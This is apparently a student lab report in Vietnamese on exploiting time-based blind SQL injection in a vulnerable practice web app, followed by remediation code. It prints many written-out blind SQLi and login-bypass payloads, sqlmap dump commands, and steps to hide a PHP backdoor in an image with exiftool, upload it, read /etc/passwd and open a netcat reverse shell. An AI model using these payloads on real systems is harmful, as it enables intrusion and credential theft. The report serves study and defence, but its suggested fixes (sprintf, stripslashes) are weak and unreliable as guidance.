 # <div align="center"><p> Sql_injection-level2 </p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 10/4/2022
 ### MỤC LỤC
 1. [Khai thác sqli level2](#gioithieu)
 
     1.1 [Phương pháp manual](#tc)
      
     1.2 [Phương pháp sử dụng sqlmap](#pp)
 
     1.3 [Phương pháp manual với BurpSuite](#p3)
     
 2. [Code mô phỏng lỗi](#mp) 
       
 3. [Code sửa lỗi sqli cho level2 và level1](#lv)

     3.1 [Code sửa lỗi sqli cho level2](#code1)
      
     3.2 [Code sửa lỗi sqli cho level1](#code2)
     
     3.3 [Các hàm sử dụng](#chsd)
 
### Nội dung báo cáo 
#### 1. Khai thác sqli level2 <a name="gioithieu"></a>
<br> 1.1 Phương Pháp manual <a name="tc"></a></br>
 - B1: Sử dụng `netdiscover` để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
 
     ![image](https://user-images.githubusercontent.com/101852647/162161017-e3d3f2d7-7a10-4490-9348-e5ce7c6378fc.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162161080-8b39fe9c-6d5c-4f6e-b87b-e69c0636687f.png)
 
 - B2:Bây giờ sử dụng nmap để tìm ra các cổng đang mở. Ta sẽ thấy cổng 80 đang mở.
 
     ![image](https://user-images.githubusercontent.com/101852647/162161149-4caf7710-31c8-4c4c-a375-30e68bd76935.png)
     
 - B3: Mở trang web lên và nhấn vào test bây giờ chúng ta sẽ test thử xem nó có url có dễ bị chèn sqli hay không bằng cách thêm `?id=1'` thì thấy không có hiện tượng gì chứng tỏ trang web này không dễ bị chèn sqli. Vì vậy chúng ta sẽ khai thác sql mù dựa trên việc thực thi mã từ xa bằng cách sử dụng một webshell php.
 
     ![image](https://user-images.githubusercontent.com/101852647/162015980-bdc27640-da14-4d99-876c-7507aa24229d.png)
     
 - B4: Chúng ta sẽ sử dụng file ` BlindSQLI.py` để tìm ra `user` và `password`. Trong đó sẽ có các câu lệnh truy xuất thông tin có trong database. Chúng ta sẽ chạy file và sử dụng câu lệnh `'''1' OR IF ((SELECT LENGTH(database()) FROM dual) = %s , sleep(1), 'a')-- -'''` để tìm ra được độ dài của database. Sử dụng câu lệnh `'''1' OR (select sleep(1) from dual where database() like '%s')-- -'''` để tìm được tên của database.
 
     ![image](https://user-images.githubusercontent.com/101852647/162573244-0e8a78cb-31f1-4398-8a63-14f16efbd99f.png)

 - B5: Tiếp theo chúng ta sử dụng câu lệnh `'''1' OR IF ((SELECT count(table_name) FROM information_schema.columns where table_schema=database()) = %s , sleep(1), 'a')-- -'''` để tìm ra và đếm được có bao nhiêu bảng trong database. Sử dụng câu lệnh ` '''1' OR IF ((SELECT COUNT(*) FROM information_schema.columns where table_name='{}') = %s , sleep(1), 'a')-- -'''` để tìm có bao nhiêu cột trong bảng đó và sử dụng câu lệnh `'''1' OR IF ((SELECT COUNT(*) FROM {}) = %s , sleep(1), 'a')-- -'''` để tìm ra có bao nhiêu hàng trong bảng đó.

      ![image](https://user-images.githubusercontent.com/101852647/162573517-14877dcc-960f-4bec-b458-19129d767380.png)

 - B6: Chúng ta sẽ sử dụng câu lệnh `'''1' OR IF ((SELECT LENGTH(table_name) FROM information_schema.columns where table_schema=database() limit 1 offset %s) = %s , sleep(1), 'a')-- -'''` và câu lệnh `'''1' OR IF ((SELECT SUBSTRING(table_name,%s,1) FROM information_schema.columns where table_schema=database() limit %s,1) = '%s' , sleep(1), 'a')-- -''` để in ra tên bảng và số cột, số hàng trong từng bảng.

      ![image](https://user-images.githubusercontent.com/101852647/162573979-c52dd568-9f89-460f-bc61-7f45f038fe00.png)
 
 - B7: Sử dụng câu lệnh `'''1' OR IF ((SELECT LENGTH(column_name) FROM information_schema.columns where table_name='{}' limit 1 offset %s) = %s , sleep(1), 'a')-- -'''` và `'''1' OR IF ((SELECT SUBSTRING(column_name,%s,1) FROM information_schema.columns where table_name='{}' limit %s,1) = '%s' , sleep(1), 'a')-- -'''` để tìm ra tên của các cột trong từng bảng.

      ![image](https://user-images.githubusercontent.com/101852647/162574050-fa7482c6-79f3-47e8-9b4e-c08d9cdf228c.png)

      ![image](https://user-images.githubusercontent.com/101852647/162574059-6ee20379-4595-4c47-a892-14501fa6174b.png)
 - B8: Chúng ta sử dụng câu lệnh`'''1' OR IF ((SELECT LENGTH(CONCAT({})) FROM {} limit %s,1) = %s , sleep(1), 'a')-- -'''` và câu lệnh `'''1' OR IF ((SELECT SUBSTRING(CONCAT({}), %s, 1) FROM {} limit %s,1) = '%s' , sleep(1), 'a')-- -'''` để tìm ra tên hàng và các dữ liệu có trong từng bảng.

      ![image](https://user-images.githubusercontent.com/101852647/162574238-16c9d729-6213-4948-9345-bd76d8818833.png)

      ![image](https://user-images.githubusercontent.com/101852647/162574248-530ceb2e-9db2-4fcb-a30b-8d3b61c4c3ac.png)
 - B9: Ở trên chúng ta đã khai thác được tên user và password nhưng vì password chúng ta đã được mã hóa ở dạng MD5 nên chúng ta sẽ giải mã nó ra. Sau khi giải mã chúng ta sẽ được password với tên là: `P4ssw0rd`.
 - B10: Sau khi có được `username` và `password` thì chúng ta sẽ đăng nhập vào trang `admin` và nhiệm vụ chúng ta bây giờ là tải lên webshell php. 

      ![image](https://user-images.githubusercontent.com/101852647/162019096-a6011726-c622-488a-9c9d-5e12a5b89db3.png)
     
      ![image](https://user-images.githubusercontent.com/101852647/162019124-3e624378-e516-4dfa-b015-1cdee9bd6861.png)  
 - B11: Bây giờ chúng ta sẽ thử tải tệp có đuôi là `.php.jpg` nhưng không được.

      ![image](https://user-images.githubusercontent.com/101852647/162019280-a8aba18e-0a05-44b1-877f-a8a6fe4ea755.png)
     
      ![image](https://user-images.githubusercontent.com/101852647/162019207-a55f96c2-8164-4143-8378-3fdde4bcaa8f.png)
      
 - B12: Sau đó, ta sử dụng `ExifTool` để liên kết một tệp php độc hại sẽ tạo ra lỗ hổng thực thi mã từ xa. Ta sẽ tải 1 file ảnh với tên là `img.png` và sao chép nó vào trong file `simple-backdoor.php` từ đường dẫn `/ usr / share / webshells / php `

     ![image](https://user-images.githubusercontent.com/101852647/162161293-29f94981-c5c2-43b6-9f04-384356cc135d.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162161358-af71eeec-7e5d-4048-8206-f40ed66594fb.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162161484-afef8ec1-375d-4116-b6f6-6efd5f6dcf84.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162161553-9a4cfac0-94b9-4367-8ab7-7ffbdc586757.png)
     
 - B13: Bây giờ gõ lệnh cho `ExifTool` để ẩn mã độc của tệp php bên trong hình ảnh png bằng lệnh `exiftool "-comment <= simple-backdoor.php" img.png `

    ![image](https://user-images.githubusercontent.com/101852647/162161620-1090e1d7-89e5-40f5-8597-f396f6cde245.png)
    
 - B14: Tiếp theo ta sẽ kiểm tra thông tin của hình ảnh bằng lệnh `exiftool img.png`. Như chúng ta có thể quan sát, mã độc được ẩn bên trong hình ảnh

    ![image](https://user-images.githubusercontent.com/101852647/162161675-330d9dc4-1fd6-428b-873c-2f1409dee8dc.png)
    
 - B15:  Bây giờ chúng ta tải ảnh có ẩn mã đọc bên trong lên trang web cũng chính là cái webshell php của chúng ta

    ![image](https://user-images.githubusercontent.com/101852647/162162220-e81d8a25-dc60-4c7e-a61b-3531b8646c3d.png)
    
 - B16: file ảnh đã tải thành công bây giờ chúng ta sẽ nhấn vào backdoor và bắt đầu thực thi nó

    ![image](https://user-images.githubusercontent.com/101852647/162162284-0c35a439-429c-455a-b42e-9ac0b7cc5199.png)
     
    ![image](https://user-images.githubusercontent.com/101852647/162162352-6683c2db-9594-411b-ad73-676d94ac47e2.png)
    
 - B17: Bây giờ chúng ta mở mã nguồn nó lên và kiểm tra xem hình ảnh được tải lên liên kết chưa. Như chúng ta thấy thì chúng ta đã tìm thấy liên kết và mở nó lên.

    ![image](https://user-images.githubusercontent.com/101852647/162162468-8f738285-9360-43f3-b226-4f493eabb764.png)
    
 - B18: Như chúng ta đã biết hình ảnh chứa một trình bao web sẽ cho phép thực thi mã từ xa. Do đó, sau khi khám phá đường dẫn được liệt kê ở trên, ta lấy tệp `/ etc / passwd`.

    ![image](https://user-images.githubusercontent.com/101852647/162162559-36b513b5-d2bc-4eca-9028-282b525775c3.png)
     
    ![image](https://user-images.githubusercontent.com/101852647/162162584-c9718e4a-6dd5-4b9e-bf38-33fd4e529c22.png)
     
 - B19: Bây giờ, chạy trình lắng nghe netcat trong thiết bị đầu cuối và thực hiện kết nối ngược lại netcat để tạo web shell

    ![image](https://user-images.githubusercontent.com/101852647/162162866-3a07624f-1f17-4f65-93a9-04e8cd54319a.png)
     
    ![image](https://user-images.githubusercontent.com/101852647/162162960-f6d9aed0-059a-48be-9893-4d170cb42459.png)


<br> 1.2 Phương Pháp sử dụng công cụ sqlmap <a name="pp"></a></br>
 - B1: Sử dụng `netdiscover` để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
 
     ![image](https://user-images.githubusercontent.com/101852647/162161017-e3d3f2d7-7a10-4490-9348-e5ce7c6378fc.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162161080-8b39fe9c-6d5c-4f6e-b87b-e69c0636687f.png)
 
 - B2:Bây giờ sử dụng nmap để tìm ra các cổng đang mở. Ta sẽ thấy cổng 80 đang mở.
 
     ![image](https://user-images.githubusercontent.com/101852647/162161149-4caf7710-31c8-4c4c-a375-30e68bd76935.png)
     
 - B3: Mở trang web lên và nhấn vào test bây giờ chúng ta sẽ test thử xem nó có url có dễ bị chèn sqli hay không bằng cách thêm `?id=1'` thì thấy không có hiện tượng gì chứng tỏ trang web này không dễ bị chèn sqli. Vì vậy chúng ta sẽ khai thác sql mù dựa trên việc thực thi mã từ xa bằng cách sử dụng một webshell php.
 
     ![image](https://user-images.githubusercontent.com/101852647/162015980-bdc27640-da14-4d99-876c-7507aa24229d.png)
     
 - B4: Chúng ta sẽ sử dụng công cụ sqlmap để tìm `username` và `password` với câu lệnh `sqlmap -u http://192.168.199.130/ --headers = ”X-Forwarded-For: 1*” --dbs`
 
     ![image](https://user-images.githubusercontent.com/101852647/162572733-35cef9ff-bb10-43b8-be14-755edbf0a1c8.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162572744-27fe5909-bef4-4df4-9bad-0febf85cee8f.png)

 - B5: Bây giờ chúng ta sẽ tìm tất cả các bảng có trong database bằng câu lệnh `sqlmap -u "http://192.168.199.130/" --headers="X-forwarded-for:1*" --tables -D photoblog --smart --batch`
 
     ![image](https://user-images.githubusercontent.com/101852647/162017389-d55355b2-0f4d-4148-9481-7ecc2ed029cc.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/162017421-4bd631c3-625e-4adc-946e-100b2936f67e.png)
  
 - B6: Tiếp theo ta sẽ tìm được `username` và `password` bằng câu lệnh `sqlmap -u "http://192.168.199.130/" --headers="X-forwarded-for:1*" --dump -T users -D photoblog --smart --batch`

     ![image](https://user-images.githubusercontent.com/101852647/162017841-25e25328-971e-404b-a3e2-3c5c7f7a3d3f.png)
    
     ![image](https://user-images.githubusercontent.com/101852647/162017894-34b9a0d1-7031-4a27-84a6-6ac0120379e8.png)
     
 - B7: Sau khi có được `username` và `password` thì chúng ta sẽ đăng nhập vào trang `admin` và nhiệm vụ chúng ta bây giờ là tải lên webshell php. Và các bước sau đó sẽ được thực hiện giống như các bước: Từ ` B10 -> B19` của `Phương pháp manual` ở trên.

<br> 1. Phương Pháp manual với BurpSuite <a name="p3"></a></br>
 - Đầu tiên chúng ta sẽ sử dụng câu lệnh `'AND sleep (5) #` để xem thử là database đó là Mysql hay database khác nếu đúng thì nó sẽ trì hoãn thời gian là 5s nhưng chỉ đúng với phiên bản >5 còn nhỏ hơn thì chúng ta nên sử dụng hàm BENCHMARK ().

     ![image](https://user-images.githubusercontent.com/101852647/163553184-f6346ba9-2ad7-480c-b680-dbe5328c5962.png)
     
 - Để chắc chắn nó là phiên bản >5 thì chúng ta sử dụng câu lệnh `’ AND IF(substring(VERSION(),1,1) = ‘5’, SLEEP(5), 0)#`

     ![image](https://user-images.githubusercontent.com/101852647/163558698-1ffc47ea-e79b-4897-9c03-45e80344e96c.png)
     
 - Bây giờ chúng ta sẽ tìm tên của database bằng câu lệnh `’ AND (SELECT sleep(5) from dual where substring(database(),1,1)=’p’)=1#` và thay đổi `...(database(),1,2)=’h’) ` thì sẽ được tên của database là: `photoblog`

     ![image](https://user-images.githubusercontent.com/101852647/163554203-a57d2d0d-f461-4d8e-9acf-90c650580569.png)

 - Sau khi đã có được tên database thì chúng ta sẽ đi tìm các bảng chứa tên đăng nhập và mật khẩu để chúng ta có thể khai thác dữ liệu bên trong bằng câu lệnh `’ AND (SELECT sleep(5) from information_schema.tables where table_name LIKE ‘%admin%’)=1 #`. Bây giờ chúng ta sẽ tìm các bảng với tên như: admin, login, users và thay đổi tên bằng cách thế vào ‘%admin%’ bằng ‘%users%’ . Nếu tên nào có ký tự khớp với ký tự có trong database nó sẽ trì hoãn 5s và ta có được tên bảng cần tìm là: `users`.

     ![image](https://user-images.githubusercontent.com/101852647/163554806-b5315d2e-2b23-4241-8477-d7f8199bffd0.png)

     ![image](https://user-images.githubusercontent.com/101852647/163554833-df5d0e97-b945-4fb2-9a2c-7a0ea9372ee8.png)

 - Sau khi có được tên bảng cần khai thác thì bây giờ chúng ta sẽ tìm tên các cột có trong bảng đó bằng câu lệnh `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%login%’ AND table_name=’users’)=1 #`. Tên cột thứ 1 là: `login`

     ![image](https://user-images.githubusercontent.com/101852647/163555543-31c80995-442e-4120-a932-ff29a4f8699f.png)

 - Tương tự để tìm tên cột tiếp theo `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%password%’ AND table_name=’users’)=1 #`. Tên cột thứ 2 là `password`

     ![image](https://user-images.githubusercontent.com/101852647/163555700-d7f65b34-59b2-43bb-9fdb-938495ecb3c6.png)
 
 - Tiếp theo chúng ta sẽ liệt kê tên người dùng câu lệnh `’ AND IF( (select substring(login,1,1) from users limit 0,1)=’a’ , SLEEP(5), 0)#` và cứ tiếp tục thay đổi`(login,1,2) from users limit 0,1)=’d’` cho đến khi được tên user là: `admin`.

     ![image](https://user-images.githubusercontent.com/101852647/163556231-cfbb0254-114d-4e15-8f85-7edd93bf4e49.png)

 - Tương tự như với user thì để tìm được password chúng ta sử dụng câu lệnh `’ AND IF( (select substring(password,1,1) from users limit 0,1)=’a’ , SLEEP(5), 0)#`.

     ![image](https://user-images.githubusercontent.com/101852647/163556439-dba3ae8c-73a7-4004-9c38-08fab15467b8.png)

 - Sau khi đã có được password là:`8efe310f9ab3efeae8d410a8e0166eb2` thì chúng ta sẽ giải mã nó và được passord là: `P4ssw0rd`.
 
#### 2. Code mô phỏng lỗi <a name="mp"></a>
 - Đây là code có lỗi sqli:
 
    ![image](https://user-images.githubusercontent.com/101852647/162029521-874db98a-9d03-4de8-a275-68ac6a233767.png)
    
 - Khi trang web của chúng ta không đảm bảo an toàn chống lại cái Time blind sqli thì rất dễ bị chèn các câu lệnh truy vấn để lấy đi thông tin có trong database như hình bên dưới:

    ![image](https://user-images.githubusercontent.com/101852647/162585582-bd561f37-6f8f-45c6-b576-f48282b8ff14.png)
    
#### 3. Code sửa lỗi sqli cho level2 và level1 <a name="lv"></a>
<br> 3.1 Code sửa lỗi sqli cho level2 <a name="code1"></a></br>
 - Đây là code có lỗi sqli:
 
    ![image](https://user-images.githubusercontent.com/101852647/162029521-874db98a-9d03-4de8-a275-68ac6a233767.png)
    
 - Để đảm bảo trang web có thể chống lại các câu lệnh truy vấn blind sqli thì chúng ta có thể sử dụng 1 trong những cách sau đây:

  - Sử dụng hàm `sprintf` ghi một chuỗi được định dạng vào một biến.

    ![image](https://user-images.githubusercontent.com/101852647/162586187-859b86aa-b9be-4b7f-977f-a842dc8e5d18.png)
    
  - Sử dụng hàm `stripslashes` và hàm `mysqli_real_escape_string` 

    ![image](https://user-images.githubusercontent.com/101852647/162586825-91af4219-00ef-4aad-9060-4fed2bb951a1.png)

<br> 3.2 Code sửa lỗi sqli cho level1 <a name="code2"></a></br>
 - Đây là code có lỗi sqli:
 
    ![image](https://user-images.githubusercontent.com/101852647/162029521-874db98a-9d03-4de8-a275-68ac6a233767.png)
    
 - Ta test thử form đăng nhập với `username` và `password` đúng:
 
   ![image](https://user-images.githubusercontent.com/101852647/162034336-004ebb44-6497-4820-a615-c673ae826585.png)
   
   ![image](https://user-images.githubusercontent.com/101852647/162030573-546d3a0f-4ad6-496e-b3aa-fbe4f3b5ff0e.png)

- Tiếp theo, ta thử nhập `username` với tên là `'or true #` thì nó vẫn đăng nhập được:

  ![image](https://user-images.githubusercontent.com/101852647/162030773-9191bb97-bdb9-4b7c-82bf-51614b712ce9.png)
  
  ![image](https://user-images.githubusercontent.com/101852647/162030814-0d0653a0-0982-4f4e-8c00-4d4b29da2ba0.png)

- Hoặc ta chèn `'or 'a'=a` nó cũng cho đăng nhập thành công:

  ![image](https://user-images.githubusercontent.com/101852647/162031017-470348d4-01e4-4843-9745-33b09b345ee9.png)
  
  ![image](https://user-images.githubusercontent.com/101852647/162031055-1065b78c-a2c4-4f68-ba59-6fad846a1665.png)

- Nhưng khi kiểm tra lại trong Database lại không có tên user đó:

  ![image](https://user-images.githubusercontent.com/101852647/162032015-eca1bb36-de40-43b6-bdd9-728d73ec34e2.png)

- Ta tiến hành chỉnh sửa code để khắc phục sqli:
 - Sử dụng những câu lệnh được tham số hóa:

   ![image](https://user-images.githubusercontent.com/101852647/162032811-d4fad498-3119-40e8-bd46-5bbc85a1a1ef.png)
  
  - Sau khi thử lại với `'or true #` hoặc  `'or 'a'=a` nó cũng không cho đăng nhập:
  
   ![image](https://user-images.githubusercontent.com/101852647/162033174-413f08f7-9347-4c31-8bec-b7be7f7dddc3.png)
 
 - Sử dụng hàm `mysqli_real_escape_string()`:

  ![image](https://user-images.githubusercontent.com/101852647/162033367-0b19509e-c019-4b4a-bf11-767c61b56649.png)

  <br> 3.3 Các hàm đã sử dụng <a name="chsd"></a></br>
  - Hàm `sprintf`: ghi một chuỗi được định dạng vào một biến.
  - hàm `mysqli_real_escape_string()`:Thoát các ký tự đặc biệt trong một chuỗi để sử dụng trong một câu lệnh SQL.
  - Hàm `stripslashes`: Sẽ loại bỏ dấu chéo ngược.



